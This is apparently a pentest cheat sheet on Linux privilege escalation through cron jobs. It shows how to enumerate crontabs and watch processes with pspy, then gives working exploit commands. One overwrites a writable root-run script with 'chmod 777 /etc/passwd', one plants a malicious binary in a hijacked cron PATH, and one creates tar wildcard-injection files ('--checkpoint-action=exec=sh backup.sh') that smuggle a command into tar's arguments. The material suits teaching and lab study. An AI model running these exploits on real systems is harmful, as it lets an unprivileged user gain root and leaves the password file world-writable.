## Find crontabs as normal user  
<br>

If the crontab is configured in `/etc/crontab` then everyone can read the file:

```bash
cat /etc/crontab

# Other cron files:
-rw-------   1 root root    541 Aug  8  2019 anacrontab
drwxrwxrwx.  2 root root     51 Mar 19  2020 cron.d
drwxrwxrwx.  2 root root     54 Mar 19  2020 cron.daily
-rw-------   1 root root      0 Aug  8  2019 cron.deny
drwxrwxrwx.  2 root root     21 Mar 19  2020 cron.hourly
drwxrwxrwx.  2 root root      6 Jun  9  2014 cron.monthly
-rw-r--r--   1 root root    771 Mar 18  2020 crontab
drwxrwxrwx.  2 root root      6 Jun  9  2014 cron.weekly
```
<br>

If the cronjob is scheduled by using `crontab -e` command:

```bash
# Check crontabs
crontab -l

# Check other user crontabs
crontab -l -u <username>

ls -lha /var/spool/cron/
cat /var/spool/cron/*

#log files :
#ubuntu & debian:
grep CRON /var/log/syslog
tail -f /var/log/syslog | grep CRON

#centos & redhat
tail /var/log/cron
tail -f /var/log/cron

```
<br>

---

## Using pspy for finding cronjobs

**pspy - unprivileged Linux process snooping**

https://github.com/DominicBreuker/pspy

Download the pspy binary according to the architecture of target and transfer it to the target. If the target has internet connection, use wget to directly download the file.

```bash
# Give it executable permission
chmod +x pspy*
./pspy64
```

When the cronjob runs, by matching the timestamp we can find out which command/file is being executed by crontab.

<br>

---

### Writable Script Exploitation

If a cron job runs a script as root, but you have write permissions, you can modify the script to execute a command as root.

Find writable cron jobs:

```bash
cat /etc/crontab

crontab -l

find /etc/cron* /var/spool/cron* -type f -writable 2>/dev/null
```

Example vulnerable cron job (`/etc/crontab`):

```bash
* * * * * root /usr/local/bin/writable.sh
```

Replace it's content :

```bash
echo 'chmod 777 /etc/passwd' > /usr/local/bin/writable.sh
```

If the cronjob command is a `.py` file, add these lines:

```bash
import os
cmd = 'chmod 777 /etc/passwd'
os.system(cmd)
```

Now when the crontab execution time comes, the permission on `/etc/passwd` will change.

---

## Abusing cron Path / Path Hijacking

In the cron configuration file `/etc/crontab`, the `PATH` variable is initialized. If misconfigured, we can set malicious binaries to the misconfigured priority `PATH` with the same name of script/command used in the cronjob definition.

Find the path in crontab file:

```bash
cat /etc/crontab

SHELL=/bin/bash
PATH=/home/armour/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12)
# |  |  |  |  .---- day of week (0 - 6)
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
  *  *  *  *  * root ifconfig
```

If the path directory does not exist, create one.

Exploit:

```bash
mkdir /home/armour/bin
echo 'chmod 777 /etc/passwd' > /home/armour/bin/ifconfig
chmod +x /home/armour/bin/ifconfig
```

When triggered, it will change the permissions of `/etc/passwd`.
<br>

---

### Wildcard Injection (* Expansion)

If a cron job runs with a wildcard (`*`), it can be exploited. Example:

```bash
* * * * * root tar -czf /tmp/backup.tar.gz /home/user/*
```

This cronjob uses `tar` command to take backup of user’s home directory using the wildcard (`*`).

Exploit :

Create a `backup.sh` file:

```bash
cd
echo 'chmod 777 /etc/passwd' > backup.sh
```

Create first switch:

```bash
echo "" > "--checkpoint-action=exec=sh backup.sh"
```

Create second switch:

```bash
echo "" > --checkpoint=1
```

Now when the cronjob runs, it will change the permissions of `/etc/passwd`.

